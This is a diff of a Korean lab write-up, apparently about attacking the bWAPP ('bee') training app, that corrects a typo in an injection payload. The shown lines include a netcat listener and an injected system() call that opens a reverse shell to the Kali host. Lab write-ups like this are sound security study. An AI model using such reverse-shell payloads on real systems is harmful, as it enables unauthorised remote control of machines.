@@ -68,7 +68,7 @@ OS Command Injection 에서 했던 것 처럼,
 
 - Kali : `nc -lvp 6666`
 
-- bee : `msf;system("nc <Kali IP> 6666 -e /bin/sh")`
+- bee : `msg;system("nc <Kali IP> 6666 -e /bin/sh")`
 
 ![chrome_8TOzxhRz8z](https://user-images.githubusercontent.com/79683414/134449912-7156715f-00a0-43f6-a824-d522470e6905.png)
 ![vmware_7POsRRx4rB](https://user-images.githubusercontent.com/79683414/134449957-57377247-7e7a-4e81-9e92-27351c19dd40.png)
